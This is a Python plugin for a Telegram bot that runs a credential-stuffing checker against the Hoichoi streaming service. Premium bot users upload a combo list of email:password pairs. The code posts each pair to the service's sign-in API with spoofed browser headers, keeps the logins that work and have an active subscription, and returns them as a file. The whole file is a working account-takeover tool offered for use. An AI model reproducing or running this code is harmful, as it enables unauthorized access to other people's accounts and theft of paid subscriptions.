import os
import requests
from tqdm import tqdm
from pyrogram import Client, filters
from pyrogram.types import Message


head = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
    'accept': 'application/json, text/plain, */*',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://www.hoichoi.tv',
    'referer': 'https://www.hoichoi.tv/',
}


def register(app):
    @app.on_message(filters.command("hoichoi"))
    async def hoichoi_helper_command(app: Client, message: Message):
        with open(file="users/premium.txt", mode="r+", encoding="utf-8") as premium:
            premium_users = premium.readlines()
        if str(message.from_user.id)+'\n' in premium_users:
            status = await message.reply_text('<i>Hoichoi Checking...</i>')
            try:
                # Check if the message contains an attached document
                if message.reply_to_message and message.reply_to_message.document:
                    document = await app.download_media(message.reply_to_message.document)
                    combos = []
                    with open(document, 'r') as file:
                        for line in file:
                            combo = line.strip()  # Remove leading/trailing whitespaces
                            combos.append(combo)
                    os.remove(document)  # Delete the downloaded combo file
                else:
                    # No attached document or invalid reply, notify the user
                    await status.edit_text(text='</b>Please reply with a valid combo.txt file😡.</b>')
                    return

                session_request = requests.Session()

                total_combos = len(combos)
                checked_combos = 0
                success_count = 0
                error_count = 0
                success_log = []

                with tqdm(combos, desc='Checking combos', unit='combo', ncols=80) as progress_bar:
                    for combo in progress_bar:
                        combo_split = combo.split(':')
                        if len(combo_split) != 2:
                            # Invalid combo format, skip to the next combo
                            continue

                        inpumail = combo_split[0]
                        inpupass = combo_split[1]

                        email = f'"email":"{inpumail}"'
                        password = f'"password":"{inpupass}"'

                        url = 'https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-f76c181a-94b5-11eb-a8b3-0242ac130003'
                        payload = '{%s,%s}' % (email, password)
                        response = session_request.post(
                            url, headers=head, data=payload)
                        result = response.json()

                        checked_combos += 1

                        if response.status_code != 200:
                            code = result.get('code')
                            messg = result.get('error')
                            error_count += 1
                            continue

                        elif result.get('isSubscribed') is False:
                            continue

                        success_count += 1
                        success_log.append(combo)

                        # Update progress in Telegram chat
                        progress_text = f'<b>Checked Combos:</b> {checked_combos}/{total_combos}\n' \
                                        f'<b>Success Count:</b> {success_count}\n' \
                                        f'<b>Error Count:</b> {error_count}\n' \
                                        f'<b>Combo:</b> {combo}'
                        await status.edit_text(text=progress_text)

                if success_log:
                    # Output success log
                    success_log_text = '\n'.join(success_log)
                    with open('Hoichoi_Account.txt', 'w') as file:
                        file.write(success_log_text)
                    await app.send_document(message.chat.id, 'Hoichoi_Account.txt')
                    # Delete the success log file
                    os.remove('Hoichoi_Account.txt')

                # Generate final status message
                message_text = (
                    f'<b>Checked Combos:</b> {checked_combos}/{total_combos}\n'
                    f'<b>Success Count:</b> {success_count}\n'
                    f'<b>Error Count:</b> {error_count}'
                )

                await status.edit_text(text=message_text)

            except requests.exceptions.RequestException as e:
                print(f"An error occurred during the request: {e}")
                await status.edit_text(text="<b>An error occurred during the request. Please try again later.</b>")

            except KeyError:
                print("Failed to parse the response JSON.")
                await status.edit_text(text="<b>Failed to parse the response JSON. Please try again later.</b>")
        else:
            await message.reply("<strong>Only For Premium Users😞</strong>")
